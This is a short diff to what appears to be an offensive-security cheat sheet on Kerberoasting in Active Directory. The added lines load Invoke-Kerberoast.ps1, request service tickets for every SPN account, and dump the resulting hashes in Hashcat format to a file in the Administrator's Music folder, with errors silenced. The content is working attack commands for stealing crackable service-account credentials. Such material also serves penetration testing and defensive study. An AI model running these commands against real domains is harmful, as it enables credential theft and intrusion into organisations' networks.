@@ -16,7 +16,9 @@ Get-NetUser -SPN
 Get every available SPN account, request a TGS, and dump its hash
 
 ```text
-Invoke-Kerberoast
+. .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -OutputFormat Hashcat
+Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'C:\Users\Administrator\Music\hash_capture.txt' -Width 8000
 ```
 
 Requesting the TGS for a single account:
